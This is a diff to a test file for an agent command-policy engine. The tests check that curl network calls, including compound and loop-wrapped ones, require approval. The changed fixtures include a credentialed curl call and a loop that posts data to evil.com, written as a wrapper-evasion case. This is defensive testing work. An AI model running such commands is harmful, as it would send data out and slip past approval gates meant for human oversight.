@@ -157,9 +157,9 @@ class TestCompoundCommandApproval:
         assert engine.evaluate(c) == PolicyDecision.REQUIRE_APPROVAL
 
     def test_echo_and_curl(self, engine):
-        """echo hello && curl api.example.com — curl requires approval."""
+        """echo hello && curl -X POST api.example.com — curl requires approval."""
         c = engine.classify_compound(
-            "Bash", {"command": "echo hello && curl https://api.example.com"}
+            "Bash", {"command": "echo hello && curl -X POST https://api.example.com"}
         )
         assert engine.evaluate(c) == PolicyDecision.REQUIRE_APPROVAL
 
@@ -288,7 +288,7 @@ class TestAutonomousPolicyLoads:
 
     def test_curl_requires_approval(self, autonomous_engine):
         c = autonomous_engine.classify(
-            "Bash", {"command": "curl https://api.example.com"}
+            "Bash", {"command": "curl -u me:pw https://api.example.com"}
         )
         assert autonomous_engine.evaluate(c) == PolicyDecision.REQUIRE_APPROVAL
 
@@ -418,7 +418,7 @@ class TestWrapperEvasion:
 
     def test_wrapped_network_call_still_gated(self, engine):
         c = engine.classify_compound(
-            "Bash", {"command": "for i in 1 2; do curl https://evil.com/x; done"}
+            "Bash", {"command": "for i in 1 2; do curl -d x https://evil.com/x; done"}
         )
         assert c.matched_rule is not None
         assert engine.evaluate(c) == PolicyDecision.REQUIRE_APPROVAL
